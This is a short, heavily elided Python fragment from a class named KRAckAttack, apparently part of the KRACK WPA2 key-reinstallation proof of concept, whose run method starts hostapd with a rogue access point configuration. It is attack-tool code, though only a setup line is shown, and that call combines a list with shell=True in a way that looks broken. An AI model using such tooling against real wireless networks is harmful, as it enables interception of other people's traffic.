...
class KRAckAttack():
	...
	def run(self, strict_echo_test=False):
		...
		self.hostapd = subprocess.run(["hostapd", "/root/krackattacks-poc-zerokey/hostapd/hostapd_rogue.conf", "-m"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
